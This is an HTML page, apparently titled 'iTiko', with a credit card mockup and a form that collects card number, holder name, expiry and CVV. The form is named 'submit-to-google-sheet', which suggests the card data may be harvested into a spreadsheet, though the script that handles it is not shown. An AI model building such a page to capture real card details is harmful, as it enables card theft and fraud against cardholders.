<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iTiko</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css"
        integrity="sha512-PgQMlq+nqFLV4ylk1gwUOgm6CtIIXkKwaIHp/PAIWHzig/lKZSEGKEysh0TCVbHJXCLN7WetD8TFecIky75ZfQ=="
        crossorigin="anonymous" />
        
    <link rel="stylesheet" type="text/css" href="card.css">  
</head>
<body>
    <div class="container">

        <div class="card-container">
    
            <div class="front">
                <div class="image">
                    <img src="images/chip.png" alt="">
                    <img src="images/visa.png" alt="">
                </div>
                <div class="card-number-box">#### #### #### ####</div>
                <div class="flexbox">
                    <div class="box">
                        <span>card holder</span>
                        <div class="card-holder-name">full name</div>
                    </div>
                    <div class="box">
                        <span>expires</span>
                        <div class="expiration">
                            <span class="exp-month">mm</span>
                            <span class="exp-year">yy</span>
                        </div>
                    </div>
                </div>
            </div>
    
            <div class="back">
                <div class="stripe"></div>
                <div class="box">
                    <span>cvv</span>
                    <div class="cvv-box"></div>
                    <img src="images/visa.png" alt="">
                </div>
            </div>
    
        </div>
    
        <form action="view.html" class="form" id="form" name="submit-to-google-sheet" onsubmit="return validateAndSubmitInCard()">
            <div class="inputBox">
                <span>card number</span>
                <input type="tel" id="cardNo" maxlength="16" class="card-number-input" onchange="handleCardNo(value)" required>
            </div>
            <div class="inputBox">
                <span>card holder</span>
                <input type="text" id="cardHolder" pattern="[A-Za-z]+" class="card-holder-input" onchange="handleCardHolder(value)" required>
            </div>
            <div class="flexbox">
                <div class="inputBox">
                    <span>expiration mm</span>
                    <select name="" id="expMonth" class="month-input" onchange="handleExpMonth(value)" required>
                        <option value="month" selected disabled>month</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                </div>
                <div class="inputBox">
                    <span>expiration yy</span>
                    <select name="" id="expYear" class="year-input" onchange="handleExpYear(value)" required>
                        <option value="year" selected disabled>year</option>
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                        <option value="2030">2031</option>
                        <option value="2030">2032</option>
                        <option value="2030">2033</option>
                    </select>
                </div>
                <div class="inputBox">
                    <span>cvv</span>
                    <input type="tel" id="cvv" maxlength="4" class="cvv-input" onchange="handleCardCVV(value)" required>
                </div>
            </div>
            <input type="submit" value="submit" class="submit-btn">
        </form>
    
    </div>
    <script src="card.js"></script>

</body>
</html>
